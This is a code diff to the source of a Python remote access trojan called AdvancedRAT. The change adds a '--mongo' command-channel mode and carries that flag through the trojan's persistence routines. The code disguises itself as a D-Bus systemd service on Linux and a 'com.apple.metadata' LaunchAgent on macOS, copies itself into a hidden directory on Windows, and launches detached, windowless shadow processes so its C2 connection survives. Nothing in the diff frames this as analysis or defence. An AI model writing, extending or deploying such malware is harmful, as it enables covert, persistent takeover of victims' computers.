@@ -1380,18 +1380,18 @@ class PersistenceManager:
     """Multi-vector persistence installation and removal (Cross-platform)"""
 
     @staticmethod
-    def install_persistence():
+    def install_persistence(is_mongo_mode=False):
         """Install persistence based on platform"""
         if IS_WINDOWS:
-            return PersistenceManager._windows_persistence()
+            return PersistenceManager._windows_persistence(is_mongo_mode)
         elif IS_LINUX:
-            return PersistenceManager._linux_persistence()
+            return PersistenceManager._linux_persistence(is_mongo_mode)
         elif IS_MAC:
-            return PersistenceManager._macos_persistence()
+            return PersistenceManager._macos_persistence(is_mongo_mode)
         return False, ["Platform not supported"]
     
     @staticmethod
-    def _windows_persistence():
+    def _windows_persistence(is_mongo_mode=False):
         """Stealthy Windows persistence with multiple fallbacks"""
         results = []
         try:
@@ -1419,6 +1419,9 @@ class PersistenceManager:
                 if os.path.exists(potential_pythonw):
                     executable = potential_pythonw
                 run_cmd = f'"{executable}" "{target_path}"'
+                
+            if is_mongo_mode:
+                run_cmd += ' --mongo'
 
             # Copy to hidden directory if not already there
             if os.path.abspath(source_path) != os.path.abspath(target_path):
@@ -1483,7 +1486,7 @@ class PersistenceManager:
         return None
     
     @staticmethod
-    def _linux_persistence():
+    def _linux_persistence(is_mongo_mode=False):
         """Stealthy Linux persistence with shadowing"""
         try:
             # Mask name
@@ -1519,8 +1522,10 @@ Description=D-Bus system bus daemon
 After=network.target
 
 [Service]
-ExecStart={sys.executable} {target_path}
+Type=simple
+ExecStart=/usr/bin/python3 {target_path}{' --mongo' if is_mongo_mode else ''}
 Restart=always
+RestartSec=60
 
 [Install]
 WantedBy=default.target
@@ -1536,7 +1541,7 @@ WantedBy=default.target
             return False, [f"Linux persistence failed: {str(e)}"]
     
     @staticmethod
-    def _macos_persistence():
+    def _macos_persistence(is_mongo_mode=False):
         """Stealthy macOS persistence with shadowing"""
         try:
             mask_name = "com.apple.metadata"
@@ -1557,15 +1562,18 @@ WantedBy=default.target
     <string>{mask_name}</string>
     <key>ProgramArguments</key>
     <array>
-        <string>{sys.executable}</string>
+        <string>/usr/bin/python3</string>
         <string>{target_path}</string>
-    </array>
+'''
+            if is_mongo_mode:
+                plist_content += "        <string>--mongo</string>\n"
+            plist_content += """    </array>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
     <true/>
 </dict>
-</plist>'''
+</plist>"""
             
             plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{mask_name}.plist")
             with open(plist_path, "w") as f:
@@ -2556,6 +2564,14 @@ class AdvancedRAT:
     def _connection_loop(self):
         """Main connection loop with failover and mandatory backoff"""
         while self.running:
+            if getattr(self, 'mongo_mode', False):
+                try:
+                    self._mongodb_loop()
+                except Exception as ex:
+                    self.logger.error(f"Error in MongoDB Loop: {ex}")
+                time.sleep(5)
+                continue
+                
             try:
                 server = C2_SERVERS[self.current_server_index]
                 
@@ -4451,7 +4467,8 @@ class AdvancedRAT:
     def _handle_persistence(self, cmd):
         """Install persistence and immediately launch the shadow process so the
         C2 connection survives even if this (original) instance is closed."""
-        success, details = PersistenceManager.install_persistence()
+        is_mongo = getattr(self, 'mongo_mode', False)
+        success, details = PersistenceManager.install_persistence(is_mongo_mode=is_mongo)
         if success:
             try:
                 shadow_path = PersistenceManager.get_shadow_path()
@@ -4461,8 +4478,10 @@ class AdvancedRAT:
                         if is_frozen:
                             # Frozen exe: launch the copied exe directly — no interpreter needed
                             # DETACHED_PROCESS (0x8) | CREATE_NO_WINDOW (0x08000000)
+                            args = [shadow_path]
+                            if is_mongo: args.append("--mongo")
                             subprocess.Popen(
-                                [shadow_path],
+                                args,
                                 creationflags=0x08000008,  # DETACHED + NO_WINDOW
                                 close_fds=True,
                             )
@@ -4472,15 +4491,19 @@ class AdvancedRAT:
                             pythonw = os.path.join(os.path.dirname(exe), "pythonw.exe")
                             if os.path.exists(pythonw):
                                 exe = pythonw
+                            args = [exe, shadow_path]
+                            if is_mongo: args.append("--mongo")
                             subprocess.Popen(
-                                [exe, shadow_path],
+                                args,
                                 creationflags=0x08000008,  # DETACHED + NO_WINDOW
                                 close_fds=True,
                             )
                     else:
                         # Linux / macOS: use a completely detached session
+                        args = [sys.executable, shadow_path]
+                        if is_mongo: args.append("--mongo")
                         subprocess.Popen(
-                            [sys.executable, shadow_path],
+                            args,
                             start_new_session=True,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
@@ -5346,6 +5369,7 @@ if __name__ == "__main__":
         parser.add_argument('--port', type=int, help='C2 Server Port', default=C2_PORT)
         parser.add_argument('--takeover', action='store_true', help='Take over from previous instance')
         parser.add_argument('--shadow-process', action='store_true', help='Run in background shadow mode')
+        parser.add_argument('--mongo', action='store_true', help='Start directly in MongoDB mode')
 
         args, unknown = parser.parse_known_args()
 
@@ -5379,6 +5403,8 @@ if __name__ == "__main__":
 
         print("[*] Starting RAT backend...")
         rat = AdvancedRAT()
+        if args.mongo:
+            rat.mongo_mode = True
         while rat.running:
             time.sleep(1)
 
